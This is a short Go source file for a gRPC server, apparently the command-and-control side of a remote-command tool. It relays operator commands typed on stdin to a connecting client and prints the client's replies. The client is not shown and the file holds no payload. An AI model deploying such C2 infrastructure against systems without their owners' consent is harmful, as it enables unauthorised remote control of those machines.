package main

import (
	"bufio"
	router "c2/router"
	"context"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"

	"google.golang.org/grpc"
)

var (
	port = flag.Int("port", 9698, "The server port")
)

type server struct {
	router.UnimplementedServerServer
	work, output chan *router.Command
}

func (s *server) SendResponse(ctx context.Context, command *router.Command) (*router.Empty, error) {
	s.output <- command
	return &router.Empty{}, nil
}

func (s *server) FetchCommand(ctx context.Context, empty *router.Empty) (*router.Command, error) {
	var cmd = new(router.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

func NewServer(work, output chan *router.Command) *server {
	var server = new(server)
	server.work = work
	server.output = output
	return server
}

func main() {
	flag.Parse()
	lis, err := net.Listen("tcp", fmt.Sprintf(":%d", *port))
	if err != nil {
		log.Fatal("Error", err)
	}
	var opts []grpc.ServerOption
	s := grpc.NewServer(opts...)

	var work, output chan *router.Command
	work, output = make(chan *router.Command), make(chan *router.Command)
	server := NewServer(work, output)
	router.RegisterServerServer(s, server)
	log.Printf("Server listening at %v", lis.Addr())
	reader := bufio.NewReader(os.Stdin)
	scanner := bufio.NewScanner(reader)
	go func() {
		for scanner.Scan() {
			fmt.Println(scanner.Text())
			server.work <- &router.Command{In: scanner.Text()}
			x := <-server.output
			fmt.Println(x)
		}
	}()

	if err := s.Serve(lis); err != nil {
		log.Fatalf("Failed to serve: %v", err)
	}
}
